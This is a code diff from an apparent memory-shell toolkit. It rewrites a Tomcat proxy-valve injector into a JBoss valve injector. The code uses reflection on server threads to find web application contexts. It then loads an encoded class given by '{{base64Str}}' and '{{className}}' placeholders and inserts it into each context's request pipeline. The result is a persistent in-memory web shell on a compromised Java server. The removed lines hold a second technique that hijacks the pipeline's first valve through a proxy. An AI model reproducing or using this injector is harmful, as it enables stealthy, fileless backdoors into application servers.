@@ -1,31 +1,23 @@
-package com.reajason.javaweb.memshell.injector.tomcat;
+package com.reajason.javaweb.memshell.injector.jboss;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
-import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Set;
+import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  */
-public class TomcatProxyValveInjector implements InvocationHandler {
-
-    private Object rawValve;
-    private Object proxyValve;
+public class JbossValveInjector {
 
     static {
-        new TomcatProxyValveInjector();
+        new JbossValveInjector();
     }
 
-    public TomcatProxyValveInjector() {
+    public JbossValveInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
@@ -37,11 +29,6 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         }
     }
 
-    public TomcatProxyValveInjector(Object rawValve, Object proxyValve) {
-        this.rawValve = rawValve;
-        this.proxyValve = proxyValve;
-    }
-
     public String getClassName() {
         return "{{className}}";
     }
@@ -50,45 +37,34 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         return "{{base64Str}}";
     }
 
-    @Override
-    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
-        if ("invoke".equals(method.getName())) {
-            try {
-                Object request = args[0];
-                Object response = args[1];
-                if (proxyValve.equals(new Object[]{request, response})) {
-                    return null;
-                }
-            } catch (Throwable e) {
-                e.printStackTrace();
-                return method.invoke(rawValve, args);
-            }
-        }
-        return method.invoke(rawValve, args);
-    }
-
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object value : childrenMap.values()) {
+                Collection<?> values = childrenMap.values();
+                for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
                 }
-            } else if (thread.getContextClassLoader() != null
-                    && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader")
-                    || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
-                contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
             }
         }
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = context.getClass().getClassLoader();
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -103,20 +79,27 @@ public class TomcatProxyValveInjector implements InvocationHandler {
     @SuppressWarnings("all")
     public void inject(Object context, Object valve) throws Exception {
         Object pipeline = invokeMethod(context, "getPipeline", null, null);
-        ClassLoader contextClassLoader = context.getClass().getClassLoader();
-        Class valveClass = contextClassLoader.loadClass("org.apache.catalina.Valve");
-        Object rawValve = null;
-        String fieldName = "first";
-        try {
-            rawValve = getFieldValue(pipeline, fieldName);
-        } catch (NoSuchFieldException e) {
-            fieldName = "basic";
-            rawValve = getFieldValue(pipeline, fieldName);
+        if (isInjected(pipeline)) {
+            System.out.println("valve already injected");
+            return;
         }
-        Object proxyValve = Proxy.newProxyInstance(contextClassLoader, new Class[]{valveClass}, new TomcatProxyValveInjector(rawValve, valve));
-        setFieldValue(pipeline, fieldName, proxyValve);
-        System.out.println("proxyValve inject successful");
+        Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
+        invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
+        System.out.println("valve injected successfully");
     }
+
+    @SuppressWarnings("all")
+    public boolean isInjected(Object pipeline) throws Exception {
+        Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
+        List<Object> valvesList = Arrays.asList(valves);
+        for (Object valve : valvesList) {
+            if (valve.getClass().getName().contains(getClassName())) {
+                return true;
+            }
+        }
+        return false;
+    }
+
 
     @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
@@ -151,31 +134,19 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         }
     }
 
-    public static Field getField(Object obj, String name) throws NoSuchFieldException {
-        for (Class<?> clazz = obj.getClass();
-             clazz != Object.class;
-             clazz = clazz.getSuperclass()) {
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws Exception {
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
             try {
                 Field field = clazz.getDeclaredField(name);
                 field.setAccessible(true);
-                return field;
-            } catch (NoSuchFieldException ignored) {
-
+                return field.get(obj);
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException(name);
-    }
-
-    @SuppressWarnings("all")
-    public static void setFieldValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
-        Field field = getField(obj, name);
-        field.set(obj, value);
-    }
-
-    @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
-        Field field = getField(obj, name);
-        return field.get(obj);
+        throw new NoSuchFieldException();
     }
 
     @SuppressWarnings("all")
